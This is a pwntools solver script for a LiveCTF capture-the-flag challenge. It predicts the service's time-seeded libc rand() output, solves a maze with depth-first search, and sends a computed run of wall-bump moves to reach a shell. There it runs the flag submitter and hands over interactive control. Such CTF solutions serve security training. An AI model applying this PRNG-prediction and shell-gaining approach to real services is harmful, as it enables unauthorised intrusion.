#!/usr/bin/env python3

from pwn import *
import ctypes

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
lib = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')

# io = process('./handout/challenge')
lib.srand(lib.time(0))
for i in range(0x24f):
    lib.rand()

io.sendlineafter(b'the torment:', b'a')
io.recvline()
io.recvline()

block='###############################'
maze=[block]
for i in range(29):
    maze.append('#' + io.recvline()[:-2].decode('ascii') + '#')
maze.append(block)
for m in maze:
    print(m)

S=(0,0)
E=(0,0)

for i in range(31):
    for j in range(31):
        if maze[i][j]=='@':
            S=(i,j)
        elif maze[i][j]=='*':
            E=(i,j)
    
vst=[]
for i in range(31):
    vst.append([0]*31)

def dfs(x,d):
    vst[x[0]][x[1]]=d
    #print(x[0], x[1])
    if vst[x[0]][x[1]+1]==0 and maze[x[0]][x[1]+1]!='#':
        dfs((x[0],x[1]+1),d+1)
    if vst[x[0]][x[1]-1]==0 and maze[x[0]][x[1]-1]!='#':
        dfs((x[0],x[1]-1),d+1)
    if vst[x[0]+1][x[1]]==0 and maze[x[0]+1][x[1]]!='#':
        dfs((x[0]+1,x[1]),d+1)
    if vst[x[0]-1][x[1]]==0 and maze[x[0]-1][x[1]]!='#':
        dfs((x[0]-1,x[1]),d+1)

dfs(E,1)

cnt = 0

while vst[S[0]][S[1]]!=2:
    cnt += 1
    if vst[S[0]][S[1]+1]==vst[S[0]][S[1]]-1:
        io.sendlineafter(b'the torment:', b'e')
        S=(S[0],S[1]+1)
    elif vst[S[0]][S[1]-1]==vst[S[0]][S[1]]-1:
        io.sendlineafter(b'the torment:', b'w')
        S=(S[0],S[1]-1)
    elif vst[S[0]+1][S[1]]==vst[S[0]][S[1]]-1:
        io.sendlineafter(b'the torment:', b's')
        S=(S[0]+1,S[1])
    elif vst[S[0]-1][S[1]]==vst[S[0]][S[1]]-1:
        io.sendlineafter(b'the torment:', b'n')
        S=(S[0]-1,S[1])

for i in range(cnt):
    lib.rand()

go = 0

while True:
    if lib.rand() % 1213 == 1212:
        break
    go += 1

for i in range(go):
    if maze[S[0]][S[1] + 1] == '#':        
        io.sendlineafter(b'the torment:', b'e')
    elif maze[S[0]][S[1] - 1] == '#':        
        io.sendlineafter(b'the torment:', b'w')
    elif maze[S[0] + 1][S[1]] == '#':        
        io.sendlineafter(b'the torment:', b's')
    elif maze[S[0] - 1][S[1]] == '#':        
        io.sendlineafter(b'the torment:', b'n')


if maze[S[0]][S[1] + 1] == '*':        
    io.sendlineafter(b'the torment:', b'e')
elif maze[S[0]][S[1] - 1] == '*':        
    io.sendlineafter(b'the torment:', b'w')
elif maze[S[0] + 1][S[1]] == '*':        
    io.sendlineafter(b'the torment:', b's')
elif maze[S[0] - 1][S[1]] == '*':        
    io.sendlineafter(b'the torment:', b'n')


io.sendline(b'./submitter')
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

io.interactive()